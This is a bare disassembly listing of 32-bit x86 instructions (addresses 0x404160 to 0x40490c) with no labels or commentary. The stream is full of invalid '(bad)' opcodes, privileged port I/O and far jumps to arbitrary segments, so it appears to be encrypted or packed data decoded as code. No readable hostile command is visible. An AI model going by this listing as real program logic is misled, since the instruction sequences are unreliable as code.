  404160:	fsubr  DWORD PTR [edx+ebx*2+0x4b]
  404164:	xchg   esp,eax
  404165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404166:	pop    eax
  404167:	retf   
  404168:	fs mov ecx,0xce2566e7
  40416e:	fwait
  40416f:	ins    BYTE PTR es:[edi],dx
  404170:	shl    ah,1
  404172:	aad    0x70
  404174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404175:	mov    bl,0x93
  404177:	jne    0x4041b5
  404179:	and    eax,0x2e91764e
  40417e:	nop
  40417f:	aaa    
  404180:	dec    edx
  404181:	popf   
  404182:	(bad)  
  404183:	je     0x404144
  404185:	adc    al,0xd3
  404187:	sbb    DWORD PTR [ebp-0x37],esi
  40418a:	test   eax,0x20f427ac
  40418f:	jge    0x4041fe
  404191:	ret    0xb950
  404194:	data16 ja 0x4041c2
  404197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404198:	push   ebp
  404199:	pop    ebx
  40419a:	adc    eax,0xe9884704
  40419f:	mov    al,ds:0x62da2734
  4041a4:	iret   
  4041a5:	sub    eax,0x757288d8
  4041aa:	lock call 0x8a414c6b
  4041b0:	pop    ss
  4041b1:	test   ax,0x28d
  4041b5:	jp     0x4041a8
  4041b7:	inc    ebp
  4041b8:	adc    edx,esi
  4041ba:	push   ebp
  4041bb:	mov    fs,edi
  4041bd:	adc    BYTE PTR [eax-0x24a3ea99],ah
  4041c3:	push   ebp
  4041c4:	rcr    bl,0x8c
  4041c7:	popa   
  4041c8:	pop    esp
  4041c9:	mov    dh,0x83
  4041cb:	mov    bl,BYTE PTR [ecx+edx*4+0x5]
  4041cf:	cmc    
  4041d0:	gs scas eax,DWORD PTR es:[edi]
  4041d2:	push   ecx
  4041d3:	jnp    0x404230
  4041d5:	dec    ecx
  4041d6:	add    BYTE PTR [eax-0x52],bh
  4041d9:	idiv   ah
  4041db:	xor    DWORD PTR [edi-0x42],ebp
  4041de:	aam    0x43
  4041e0:	ja     0x4041ca
  4041e2:	mov    dh,0xba
  4041e4:	(bad)  
  4041e6:	shl    bl,0xa0
  4041e9:	scas   al,BYTE PTR es:[edi]
  4041ea:	jp     0x404222
  4041ec:	or     edx,DWORD PTR [ebx]
  4041ee:	gs dec esp
  4041f0:	xor    BYTE PTR [edi-0x2aa4cba3],bl
  4041f6:	shr    esi,1
  4041f8:	iret   
  4041f9:	imul   esi,DWORD PTR [edx],0xffffff96
  4041fc:	push   ds
  4041fd:	lds    ebx,FWORD PTR [eax+0x47da620d]
  404203:	daa    
  404204:	add    dl,cl
  404206:	dec    ebx
  404207:	or     BYTE PTR [esi-0x36],bh
  40420a:	out    0x4d,eax
  40420c:	or     esi,edi
  40420e:	and    esp,DWORD PTR [ebp+eax*8+0x23]
  404212:	int    0xaa
  404214:	sub    al,0x47
  404216:	das    
  404217:	jne    0x4041cd
  404219:	pushf  
  40421a:	jns    0x4041a9
  40421c:	(bad)  
  40421d:	outs   dx,BYTE PTR ds:[esi]
  40421e:	out    0x96,al
  404220:	retf   
  404221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404222:	mov    DWORD PTR [ebx+0x4709af36],ecx
  404228:	out    dx,eax
  404229:	xor    ecx,DWORD PTR ds:0x8ae15085
  40422f:	mov    esp,0x9e97284a
  404234:	test   al,0x35
  404236:	adc    DWORD PTR [eiz*8+0x4df941f1],0xffffff94
  40423e:	daa    
  40423f:	adc    cl,BYTE PTR [edx+0xc]
  404242:	push   edi
  404243:	dec    ebx
  404244:	out    dx,eax
  404245:	xchg   esp,eax
  404246:	shr    DWORD PTR [esp+ebx*2-0x7aeb1511],cl
  40424d:	pop    eax
  40424e:	or     BYTE PTR [edx],bl
  404250:	imul   ebx,DWORD PTR [edx],0xffffff98
  404253:	mov    WORD PTR [ebx-0x5],ss
  404256:	iret   
  404257:	daa    
  404258:	sub    eax,0x184c1916
  40425e:	mov    eax,ds:0x356e1c1f
  404264:	mov    WORD PTR [ebx-0x6d],?
  404267:	jl     0x40427d
  404269:	int3   
  40426a:	div    DWORD PTR [ebx]
  40426c:	fmul   st,st(1)
  40426e:	cdq    
  40426f:	mov    bh,0x63
  404271:	mov    al,0x76
  404273:	dec    ebp
  404274:	xor    dh,BYTE PTR [edx]
  404276:	and    al,BYTE PTR [edi+0x3788ee56]
  40427c:	icebp  
  40427d:	div    BYTE PTR [ebx+ebx*1+0x34c1374d]
  404284:	adc    edx,DWORD PTR fs:[eax+0x6dd93670]
  40428b:	add    DWORD PTR [ebx+0x3],ebx
  40428e:	mov    eax,ds:0x417368f
  404293:	jno    0x40423e
  404295:	jae    0x4042d7
  404297:	xchg   DWORD PTR [ebx-0x59568469],ebp
  40429d:	jno    0x40428c
  40429f:	loopne 0x40429a
  4042a1:	lods   eax,DWORD PTR ds:[esi]
  4042a2:	in     al,dx
  4042a3:	add    BYTE PTR [edi],ch
  4042a5:	add    eax,0x9088e459
  4042aa:	or     dh,BYTE PTR ds:0xc70709ac
  4042b0:	bswap  eax
  4042b2:	mov    eax,ss
  4042b4:	cmc    
  4042b5:	sub    bh,BYTE PTR [edx]
  4042b7:	adc    BYTE PTR [ecx+ecx*4],ch
  4042ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042bb:	inc    edi
  4042bc:	xchg   edi,eax
  4042bd:	cmp    ah,BYTE PTR [esi+0x4810ca1c]
  4042c3:	cmp    ebx,esp
  4042c5:	das    
  4042c6:	(bad)  
  4042c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042c9:	or     BYTE PTR [edx-0x4c],cl
  4042cc:	xchg   esp,eax
  4042cd:	jge    0x404318
  4042cf:	xchg   edi,eax
  4042d0:	lds    esp,FWORD PTR [ebp+0x492a86d1]
  4042d6:	loopne 0x404321
  4042d8:	mov    BYTE PTR [ecx+0xf],0x9e
  4042dc:	pop    ds
  4042dd:	arpl   WORD PTR [ecx],sp
  4042df:	pop    edx
  4042e0:	sbb    dl,dh
  4042e2:	jae    0x4042f7
  4042e4:	jb     0x4042e3
  4042e6:	xor    esi,edx
  4042e8:	dec    ecx
  4042e9:	add    al,BYTE PTR [esp+ebp*1+0x5b]
  4042ed:	jnp    0x404364
  4042ef:	jno    0x40431c
  4042f1:	(bad)  
  4042f2:	in     eax,dx
  4042f3:	jmp    0xdbe89505
  4042f8:	pop    ebx
  4042f9:	add    ebp,0x41fcddae
  4042ff:	inc    edi
  404300:	jmp    0x73008ed4
  404305:	and    dh,bl
  404307:	adc    al,0x6c
  404309:	pop    ebp
  40430a:	lods   eax,DWORD PTR ds:[esi]
  40430b:	ja     0x404374
  40430d:	fnsave [edx+0x3c16b1a5]
  404313:	push   edx
  404314:	sar    dl,1
  404316:	pop    edx
  404317:	into   
  404318:	stc    
  404319:	xor    al,0x5a
  40431b:	inc    ebx
  40431c:	sti    
  40431d:	or     al,0x8
  40431f:	idiv   DWORD PTR [eax]
  404321:	es inc edi
  404323:	add    al,0x8a
  404325:	call   0x5517bf49
  40432a:	xchg   BYTE PTR [ecx+0x4b],dl
  40432d:	xor    al,0x36
  40432f:	loope  0x404374
  404331:	or     al,0x70
  404333:	popf   
  404334:	in     al,dx
  404335:	inc    ebp
  404336:	test   eax,0xb145a3c0
  40433b:	pop    ebp
  40433c:	sbb    al,0x86
  40433e:	pop    eax
  40433f:	mov    DWORD PTR [edi],eax
  404341:	mov    eax,0xb72f9247
  404346:	out    0xca,al
  404348:	ins    BYTE PTR es:[edi],dx
  404349:	scas   eax,DWORD PTR es:[edi]
  40434a:	(bad)  
  40434b:	xor    DWORD PTR [edi],esp
  40434d:	sub    al,0x3f
  40434f:	in     al,0xe4
  404351:	clc    
  404352:	jl     0x40435a
  404354:	and    BYTE PTR [edx],dl
  404356:	into   
  404357:	inc    edi
  404358:	and    eax,DWORD PTR [edx+ebp*8+0x1830c557]
  40435f:	outs   dx,DWORD PTR ds:[esi]
  404360:	push   cs
  404361:	and    BYTE PTR [edi-0x536b8753],bh
  404367:	add    BYTE PTR [ecx],cl
  404369:	mov    ebx,0x66f9bff8
  40436e:	lds    esp,FWORD PTR [eax]
  404370:	push   0x368fb80a
  404375:	(bad)  
  404376:	mov    ds:0x5eb88660,eax
  40437b:	nop
  40437c:	xchg   ebp,eax
  40437d:	push   0x1b18b9c6
  404382:	mov    WORD PTR [ecx+ecx*8-0x26],cs
  404386:	pop    es
  404387:	cmp    al,0x9c
  404389:	hlt    
  40438a:	xchg   esi,eax
  40438b:	les    edi,FWORD PTR [ecx+0x64]
  40438e:	xor    al,0x78
  404390:	jbe    0x404353
  404392:	add    eax,0x3934b376
  404397:	push   ds
  404398:	mov    ecx,0xa1be323
  40439d:	jp     0x4043f9
  40439f:	ins    BYTE PTR es:[edi],dx
  4043a0:	pop    eax
  4043a1:	sbb    DWORD PTR [esi],eax
  4043a3:	pop    eax
  4043a4:	mov    dl,0xf7
  4043a6:	rcl    ah,0x9e
  4043a9:	sbb    esi,DWORD PTR ss:[esi-0x69]
  4043ad:	mov    esi,0x3a5f5a6c
  4043b2:	pop    es
  4043b3:	push   ebx
  4043b4:	js     0x404389
  4043b6:	(bad)  
  4043b7:	adc    eax,0x27f0d1fe
  4043bc:	es gs popf 
  4043bf:	(bad)  
  4043c0:	ins    DWORD PTR es:[edi],dx
  4043c1:	mov    dh,0x6c
  4043c3:	in     al,0xa5
  4043c5:	ss mov al,0x23
  4043c8:	dec    eax
  4043c9:	stos   DWORD PTR es:[edi],eax
  4043ca:	hlt    
  4043cb:	aas    
  4043cc:	sbb    ebp,ebp
  4043ce:	lods   eax,DWORD PTR ds:[si]
  4043d0:	pop    edi
  4043d1:	aad    0x1e
  4043d3:	push   ecx
  4043d4:	jg     0x40440d
  4043d6:	adc    ah,BYTE PTR [ebx-0x58]
  4043d9:	ins    DWORD PTR es:[edi],dx
  4043da:	dec    eax
  4043db:	dec    edi
  4043dc:	inc    edi
  4043dd:	inc    esi
  4043de:	js     0x4043b8
  4043e0:	mov    BYTE PTR [esi+0x2],bl
  4043e3:	aaa    
  4043e4:	rcl    BYTE PTR [ebp-0x4f],0xd8
  4043e8:	sbb    DWORD PTR [eax-0x38],ecx
  4043eb:	scas   al,BYTE PTR es:[edi]
  4043ec:	push   ss
  4043ed:	ret    0xef48
  4043f0:	mov    bh,0xae
  4043f2:	sub    BYTE PTR [ecx],cl
  4043f4:	mov    dl,0x41
  4043f6:	aam    0x3a
  4043f8:	pop    eax
  4043f9:	mov    ch,dh
  4043fb:	xlat   BYTE PTR ds:[ebx]
  4043fc:	push   edi
  4043fd:	mov    dh,0x74
  4043ff:	mov    ds:0xe972c304,al
  404404:	push   ebp
  404405:	sub    DWORD PTR ds:0xd478a22a,edx
  40440b:	or     DWORD PTR [ecx-0x24],esp
  40440e:	aad    0x3e
  404410:	jmp    edi
  404412:	loope  0x40440b
  404414:	mov    cl,BYTE PTR [ebp-0x861c6cf]
  40441a:	ficom  WORD PTR [edi+ecx*8-0x66617d0]
  404421:	and    ebx,DWORD PTR [ebp-0x4f]
  404424:	push   edx
  404425:	cmp    ebp,0xffffffbb
  404428:	sahf   
  404429:	pop    ebx
  40442a:	ins    BYTE PTR es:[edi],dx
  40442b:	imul   edi,DWORD PTR [ebp-0x2b],0x50
  40442f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404430:	push   edi
  404431:	push   edi
  404432:	in     al,dx
  404433:	shl    BYTE PTR [esi-0x620073d3],cl
  404439:	inc    eax
  40443a:	addr16 cmp esp,ecx
  40443d:	test   al,0xcc
  40443f:	add    bl,ah
  404441:	int3   
  404442:	jb     0x4044a4
  404444:	stc    
  404445:	imul   esp,DWORD PTR [eax+0x3c051e1b],0x6db4025d
  40444f:	mov    bh,0xbc
  404451:	jne    0x404449
  404453:	xchg   esi,eax
  404454:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404455:	inc    esi
  404456:	cs sbb dh,al
  404459:	add    ch,BYTE PTR [ecx+edi*4]
  40445c:	outs   dx,BYTE PTR ds:[esi]
  40445d:	fld    DWORD PTR ds:0xf7da62db
  404463:	sbb    esi,esi
  404465:	scas   eax,DWORD PTR es:[edi]
  404466:	idiv   ebp
  404468:	test   al,0x77
  40446a:	push   esp
  40446b:	mov    ds:0xe8dfd563,al
  404470:	aaa    
  404471:	jmp    0x18e4fc03
  404476:	sbb    ecx,DWORD PTR [eax]
  404478:	aad    0xc8
  40447a:	ins    DWORD PTR es:[edi],dx
  40447b:	xor    DWORD PTR [esi+edi*8-0x36],edx
  40447f:	aam    0x1e
  404481:	adc    DWORD PTR [esi-0x515e717f],0x960b3837
  40448b:	loop   0x404465
  40448d:	je     0x40444d
  40448f:	push   esp
  404490:	jmp    0x404490
  404492:	loope  0x4044be
  404494:	jmp    0xe069:0x5739fe78
  40449b:	(bad)  
  40449c:	mov    DWORD PTR [ebx-0x882539],ecx
  4044a2:	retf   
  4044a3:	pop    ds
  4044a4:	loop   0x4044af
  4044a6:	cmp    al,BYTE PTR [ebx-0x40]
  4044a9:	jb     0x4044c2
  4044ab:	daa    
  4044ac:	scas   al,BYTE PTR es:[edi]
  4044ad:	loop   0x40446a
  4044af:	aad    0x5b
  4044b1:	mov    DWORD PTR [edx],ebx
  4044b3:	jmp    0x404519
  4044b5:	and    dl,bh
  4044b7:	and    BYTE PTR gs:[eax-0x1],0x9f
  4044bc:	xchg   edi,eax
  4044bd:	jnp    0x404479
  4044bf:	jmp    0x99f1:0xc449e99a
  4044c6:	cmp    cl,BYTE PTR ds:0x828b5731
  4044cc:	mov    al,0x4a
  4044ce:	stos   BYTE PTR es:[edi],al
  4044cf:	cmp    ebx,DWORD PTR [ecx+0x1c]
  4044d2:	loopne 0x4044b1
  4044d4:	cmp    al,0xd8
  4044d6:	lock mov ebx,0xaf016f7e
  4044dc:	jne    0x40447c
  4044de:	call   0x31f145b4
  4044e3:	jle    0x404500
  4044e5:	sbb    al,0x5a
  4044e7:	lds    edx,FWORD PTR [eax]
  4044e9:	push   ds
  4044ea:	pop    edi
  4044eb:	repz je 0x4044ed
  4044ee:	pop    es
  4044ef:	loope  0x40455f
  4044f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044f2:	sub    BYTE PTR [eax],ch
  4044f4:	int3   
  4044f5:	xchg   DWORD PTR [eax+0x4b],ecx
  4044f8:	cmp    DWORD PTR ds:0x2e5e8170,ecx
  4044fe:	mov    ?,WORD PTR [ebp-0x679245d]
  404504:	dec    ecx
  404505:	scas   al,BYTE PTR es:[edi]
  404506:	push   ds
  404507:	and    al,0xca
  404509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40450a:	aad    0x45
  40450c:	out    dx,eax
  40450d:	mov    al,ds:0xf8e153dc
  404512:	mov    ah,0x1f
  404514:	and    esp,DWORD PTR [edx-0x45]
  404517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404518:	xor    dh,dl
  40451a:	mov    BYTE PTR [eax+0x79dd0dc],ch
  404520:	sub    al,0xa4
  404522:	arpl   WORD PTR [ebp+0x70db65b2],bx
  404528:	mov    edx,0x3387f3de
  40452d:	out    dx,eax
  40452e:	cdq    
  40452f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404530:	shl    edi,cl
  404532:	fisub  DWORD PTR [edi-0x2c71460]
  404538:	jb     0x40459c
  40453a:	push   eax
  40453b:	xchg   ebx,eax
  40453c:	clc    
  40453d:	leave  
  40453e:	cmp    eax,0x633dc632
  404543:	pop    ecx
  404544:	sbb    DWORD PTR [ecx-0x6],ecx
  404547:	ds xchg ebx,eax
  404549:	in     eax,dx
  40454a:	inc    esi
  40454b:	add    DWORD PTR [edx+0x3a],esi
  40454e:	adc    ch,ch
  404550:	test   DWORD PTR [ebx-0x38],0x930a3a28
  404557:	imul   ebp,esi,0xf29a7b46
  40455d:	dec    ebx
  40455e:	fdiv   DWORD PTR [ecx+0x1fbb4f70]
  404564:	adc    ebx,0x2a2a8c4e
  40456a:	sbb    BYTE PTR [ebx-0x24],ah
  40456d:	adc    cl,BYTE PTR [ecx-0x4e]
  404570:	inc    esi
  404571:	fisubr WORD PTR [ebx]
  404573:	inc    ebp
  404574:	pop    esi
  404575:	outs   dx,DWORD PTR ds:[esi]
  404576:	lods   eax,DWORD PTR ds:[esi]
  404577:	arpl   WORD PTR [edx],cx
  404579:	adc    ah,BYTE PTR [ecx]
  40457b:	adc    ah,ah
  40457d:	cli    
  40457e:	cmp    esp,DWORD PTR [bx]
  404581:	(bad)  
  404582:	icebp  
  404583:	and    al,0x57
  404585:	ds mov ch,0x8
  404588:	pop    DWORD PTR [ebx-0xc]
  40458b:	mov    al,ds:0x40c6cefd
  404590:	test   BYTE PTR [ecx],bl
  404592:	cli    
  404593:	jp     0x40457b
  404595:	jp     0x404526
  404597:	add    edx,DWORD PTR [edi]
  404599:	mov    dl,BYTE PTR [ecx+0x59d2afc0]
  40459f:	dec    ebp
  4045a0:	and    eax,0x30be98db
  4045a5:	sar    DWORD PTR [eax],1
  4045a7:	jb     0x404573
  4045a9:	mov    ds:0x1b245b07,al
  4045ae:	push   0xf587298f
  4045b3:	and    al,0x31
  4045b5:	adc    cl,BYTE PTR [eax-0x7c4cc719]
  4045bb:	inc    edi
  4045bc:	test   al,dh
  4045be:	xor    DWORD PTR [ecx+ebx*4+0x7cf3f780],esp
  4045c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045c6:	jg     0x404621
  4045c8:	jbe    0x404625
  4045ca:	mov    ah,0x5a
  4045cc:	jmp    0x404600
  4045ce:	mov    DWORD PTR [edi-0x7d5b8792],edi
  4045d4:	adc    dh,dl
  4045d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045d7:	mov    ebx,0x518246c6
  4045dc:	mov    bl,0x98
  4045de:	inc    esp
  4045df:	mov    ebp,0x241bff8
  4045e4:	mov    dl,0x6
  4045e6:	mov    eax,ds:0x1473b0d6
  4045eb:	out    dx,eax
  4045ec:	nop
  4045ed:	xchg   BYTE PTR [esi-0x686c2d03],al
  4045f3:	fistp  WORD PTR [ebp+0x8]
  4045f6:	pop    ds
  4045f7:	push   ebp
  4045f8:	pop    ds
  4045f9:	sar    BYTE PTR [ebx+edx*2-0x20],0x9b
  4045fe:	push   ebp
  4045ff:	fs repz jge 0x404589
  404603:	ret    0x30c4
  404606:	fmul   DWORD PTR [edx]
  404608:	adc    ecx,ecx
  40460a:	sbb    eax,0x42269c85
  40460f:	into   
  404610:	cbw    
  404612:	pop    eax
  404613:	push   cs
  404614:	jle    0x404695
  404616:	mov    cs,WORD PTR [ebx+0x26e4a690]
  40461c:	mov    ah,0xa7
  40461e:	dec    ebp
  40461f:	lahf   
  404620:	retf   
  404621:	push   edi
  404622:	dec    ebp
  404623:	push   DWORD PTR [ebx+0x66]
  404626:	scas   eax,DWORD PTR es:[edi]
  404627:	test   al,0xfc
  404629:	es nop
  40462b:	add    eax,0x5f3bc9fd
  404630:	xchg   edx,eax
  404631:	into   
  404632:	bound  esp,QWORD PTR [ecx+esi*1]
  404635:	push   esi
  404636:	mov    esp,0x9f75ecf4
  40463b:	iret   
  40463c:	pop    esi
  40463d:	call   0x1c66:0x41943752
  404644:	dec    ebp
  404645:	aas    
  404646:	loope  0x4045de
  404648:	lea    ecx,[ecx-0x12]
  40464b:	xchg   esi,eax
  40464c:	jle    0x404643
  40464e:	mov    al,0x71
  404650:	aad    0x16
  404652:	pop    ebp
  404653:	jae    0x404610
  404655:	sub    BYTE PTR [edi+0x55],al
  404658:	pop    ss
  404659:	leave  
  40465a:	cwde   
  40465b:	mov    ch,0x2f
  40465d:	mov    eax,ds:0x9b46e018
  404662:	not    DWORD PTR [esi+0x1b]
  404665:	xchg   esp,eax
  404666:	pop    ebp
  404667:	aam    0xd4
  404669:	ror    ebp,0x4
  40466c:	inc    edi
  40466d:	lods   al,BYTE PTR ds:[esi]
  40466e:	mov    ch,BYTE PTR [edx]
  404670:	retf   
  404671:	icebp  
  404672:	push   esp
  404673:	xchg   ch,dh
  404675:	inc    ebp
  404676:	out    0x75,eax
  404678:	push   ecx
  404679:	or     BYTE PTR [ecx-0x68df28d7],bl
  40467f:	hlt    
  404680:	cmp    eax,0xe1321264
  404685:	xor    eax,0xdcd4b13f
  40468a:	mov    al,BYTE PTR [eax-0x56]
  40468d:	popf   
  40468e:	cmp    eax,0x5e206554
  404693:	loopne 0x4046f4
  404695:	retf   0xf166
  404698:	pop    esp
  404699:	sub    ah,BYTE PTR [eax+0x43e7cae8]
  40469f:	xchg   esp,eax
  4046a0:	inc    ebp
  4046a1:	loop   0x40469b
  4046a3:	(bad)  
  4046a4:	icebp  
  4046a5:	add    DWORD PTR [ecx*2-0x6dcdc75],ebp
  4046ac:	push   ss
  4046ad:	repz mov ah,0x9e
  4046b0:	and    eax,0xf51277ab
  4046b5:	retf   0xfbfd
  4046b8:	nop
  4046b9:	sub    dl,al
  4046bb:	dec    esp
  4046bc:	mov    eax,0xf7de02a3
  4046c1:	rcl    BYTE PTR [eax],1
  4046c3:	or     ch,0xb4
  4046c6:	push   0x57
  4046c8:	enter  0xe484,0x4e
  4046cc:	test   DWORD PTR ds:0xb17962f5,0x79c1da42
  4046d6:	xchg   ebx,eax
  4046d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046d8:	ins    DWORD PTR es:[edi],dx
  4046d9:	dec    esp
  4046da:	add    ch,BYTE PTR [esp+ebx*4-0x25eb2927]
  4046e1:	hlt    
  4046e2:	jnp    0x40474c
  4046e4:	jp     0x404764
  4046e6:	inc    ebx
  4046e7:	pop    ss
  4046e8:	sbb    BYTE PTR ds:0xf40414ba,bl
  4046ee:	out    dx,eax
  4046ef:	ds ret 
  4046f1:	pusha  
  4046f2:	test   al,0xc2
  4046f5:	ret    0xdcc6
  4046f8:	in     eax,dx
  4046f9:	out    dx,eax
  4046fa:	mov    ah,0xf2
  4046fc:	jl     0x404707
  4046fe:	mov    dl,0x69
  404700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404701:	cli    
  404702:	pop    ds
  404703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404704:	add    al,dh
  404706:	clc    
  404707:	mov    WORD PTR [edx-0x197de4c5],?
  40470d:	push   eax
  40470e:	adc    eax,0x377d3d40
  404713:	xchg   ecx,eax
  404714:	jno    0x4046d1
  404716:	mov    eax,ds:0x1d6f04bc
  40471b:	cld    
  40471c:	fwait
  40471d:	add    DWORD PTR [edi],ebx
  40471f:	sbb    al,0x9a
  404721:	pop    ecx
  404722:	je     0x4046d0
  404724:	dec    edx
  404725:	div    DWORD PTR [ebx]
  404727:	icebp  
  404728:	shl    bh,0x85
  40472b:	je     0x404713
  40472d:	adc    al,0x3
  40472f:	jo     0x4046fc
  404731:	mov    dl,0xc7
  404733:	ror    BYTE PTR [ebx],0x51
  404736:	fcomi  st,st(5)
  404738:	push   edx
  404739:	lock lods eax,DWORD PTR ds:[esi]
  40473b:	or     BYTE PTR [edi-0x6ab3d426],0xcf
  404742:	adc    al,BYTE PTR [ebx+0x59]
  404745:	jns    0x40479b
  404747:	mov    al,0xd4
  404749:	xchg   ebp,eax
  40474a:	inc    eax
  40474b:	push   0x52
  40474d:	inc    esi
  40474e:	xchg   ebx,eax
  40474f:	shr    DWORD PTR [ecx],0xd7
  404752:	out    0x53,al
  404754:	sub    esi,DWORD PTR [ecx]
  404756:	dec    ebx
  404757:	lea    esp,[edx+0x28]
  40475a:	pop    ebx
  40475b:	dec    eax
  40475c:	and    DWORD PTR [eax+edx*1+0x58add545],esi
  404763:	xchg   esi,eax
  404764:	not    esi
  404766:	in     eax,dx
  404767:	ret    
  404768:	mov    edx,DWORD PTR [edx+0x35]
  40476b:	adc    al,0xc4
  40476d:	stc    
  40476e:	cli    
  40476f:	sbb    BYTE PTR [edi],dl
  404771:	and    eax,0x19fa7678
  404776:	mov    ?,esp
  404778:	mov    ch,0x44
  40477a:	pop    ecx
  40477b:	mov    dl,0xac
  40477d:	in     al,dx
  40477e:	(bad)  [edi+0x3a]
  404781:	pop    esp
  404782:	es sahf 
  404784:	cmp    al,0xa4
  404786:	bound  edx,QWORD PTR [edi]
  404788:	mov    esp,0xce0b5808
  40478d:	pop    es
  40478e:	fist   WORD PTR [esp+ebp*2+0x77]
  404792:	xor    ebp,DWORD PTR [ebp+edx*2-0x5df06436]
  404799:	mov    ch,BYTE PTR [esi+0x1177d4fd]
  40479f:	shl    DWORD PTR [edi+0x5a],1
  4047a2:	fistp  QWORD PTR [eax+0x79]
  4047a5:	jnp    0x404823
  4047a7:	test   DWORD PTR [eax+0x386458e2],edi
  4047ad:	or     al,0xfe
  4047af:	add    ebp,DWORD PTR [ecx+0x57c87116]
  4047b5:	and    DWORD PTR [edx+0x21],ecx
  4047b8:	mov    bh,0xbc
  4047ba:	mov    ch,0x3b
  4047bc:	in     eax,dx
  4047bd:	mov    ebp,0x90489245
  4047c2:	pop    edx
  4047c3:	or     al,0x74
  4047c5:	lods   al,BYTE PTR ds:[esi]
  4047c6:	mov    WORD PTR [ebp+0x15f2af48],?
  4047cc:	push   0xffffffef
  4047ce:	sub    al,0x34
  4047d0:	mov    eax,0x7515e3c6
  4047d5:	jae    0x404816
  4047d7:	hlt    
  4047d8:	lea    edi,[ebx]
  4047da:	idiv   esp
  4047dc:	dec    edi
  4047dd:	mov    ecx,0x645d7a38
  4047e2:	test   eax,0xbb0478c9
  4047e7:	jmp    0x6797:0x5a208e40
  4047ee:	sub    DWORD PTR ds:0xf72e558a,esp
  4047f4:	cmp    ebp,DWORD PTR [edx-0x6a]
  4047f7:	push   ds
  4047f8:	outs   dx,DWORD PTR ds:[esi]
  4047f9:	xchg   esp,eax
  4047fa:	mov    ecx,DWORD PTR [ecx+ecx*2+0x1bc135e1]
  404801:	std    
  404802:	fdiv   QWORD PTR [ecx-0x15c38acb]
  404808:	xchg   esi,eax
  404809:	aas    
  40480a:	cli    
  40480b:	fcmovnbe st,st(6)
  40480d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40480e:	sbb    eax,0x58ee89b1
  404813:	(bad)  
  404814:	frstor [ecx+0x5407e190]
  40481a:	push   ss
  40481b:	dec    edx
  40481c:	mov    bh,0x21
  40481e:	rcl    BYTE PTR [ecx+0x1594bb85],cl
  404824:	push   ss
  404825:	cmp    eax,0x561b611f
  40482a:	bound  edx,QWORD PTR [ebx]
  40482c:	call   0x303ed2a8
  404831:	jmp    0x75f7:0x267ea85a
  404838:	mov    eax,0xe4f62b5d
  40483d:	in     eax,0xd2
  40483f:	test   al,0x3a
  404841:	mov    edx,0xd83745d6
  404846:	sub    ch,cl
  404848:	ror    WORD PTR [ebx+0x5c],1
  40484c:	mov    eax,ds:0x476f925c
  404851:	jl     0x40482c
  404853:	repz and BYTE PTR [eax-0x5f],0x2a
  404858:	or     dl,BYTE PTR [esi+0x60]
  40485b:	and    bh,bl
  40485d:	inc    esp
  40485e:	inc    esp
  40485f:	cmp    ebp,edx
  404861:	pop    ebp
  404862:	rol    bh,1
  404864:	sbb    eax,0x74bec88e
  404869:	rcl    DWORD PTR [esi+esi*8+0x3a8ea60d],cl
  404870:	imul   ebp,DWORD PTR [esi+0x61],0xe600f607
  404877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404878:	push   0x8ca5ea75
  40487d:	imul   BYTE PTR [ebx+eiz*8]
  404880:	ss cli 
  404882:	(bad)  
  404883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404884:	std    
  404885:	mov    bl,0x20
  404887:	pop    edx
  404888:	ja     0x40485a
  40488a:	in     eax,dx
  40488b:	mov    cl,BYTE PTR [ebx+0x20b3c34a]
  404891:	adc    al,0xd9
  404893:	dec    ebx
  404894:	mov    al,0x62
  404896:	jmp    0x4048a0
  404898:	aad    0x74
  40489a:	aaa    
  40489b:	sub    BYTE PTR [ebx+0x59f746a6],ah
  4048a1:	fcomp  DWORD PTR [esi-0x5d3fac01]
  4048a7:	call   0x53a8:0x52f26213
  4048ae:	or     al,0x26
  4048b0:	call   0x6f14de1b
  4048b5:	mov    esi,0x8fd660cf
  4048ba:	inc    esp
  4048bb:	adc    DWORD PTR [ebx],0xa3d0ab87
  4048c1:	inc    ecx
  4048c2:	(bad)  
  4048c3:	fisubr WORD PTR [esi]
  4048c5:	int3   
  4048c6:	repz (bad) 
  4048c8:	and    BYTE PTR [ecx],al
  4048ca:	xor    ebp,DWORD PTR [eax-0x946914]
  4048d0:	xchg   edi,eax
  4048d1:	pop    ebp
  4048d2:	mov    al,BYTE PTR [ecx]
  4048d4:	stos   DWORD PTR es:[edi],eax
  4048d5:	sub    eax,DWORD PTR [edx]
  4048d7:	xchg   edi,eax
  4048d8:	outs   dx,DWORD PTR ds:[esi]
  4048da:	cmp    al,0x5d
  4048dc:	mov    ds:0xde4f6bab,eax
  4048e1:	jmp    0x404949
  4048e3:	adc    cl,BYTE PTR [ecx+0x6915f3c]
  4048e9:	sbb    BYTE PTR [eax],ah
  4048eb:	dec    bp
  4048ed:	mov    esp,0x209f8fe4
  4048f2:	xor    BYTE PTR [esi],dl
  4048f4:	xlat   BYTE PTR ds:[ebx]
  4048f5:	xor    al,0xc
  4048f7:	inc    ecx
  4048f8:	adc    BYTE PTR [ebp+0x105f3a9b],ch
  4048fe:	pop    ebp
  4048ff:	lds    esp,FWORD PTR [ecx]
  404901:	fstp   QWORD PTR [esi]
  404903:	push   esp
  404904:	inc    esp
  404905:	pop    ebx
  404906:	repz cld 
  404908:	repnz into 
  40490a:	mov    edx,esi
  40490c:	or     BYTE PTR [ecx+0x5c],bl
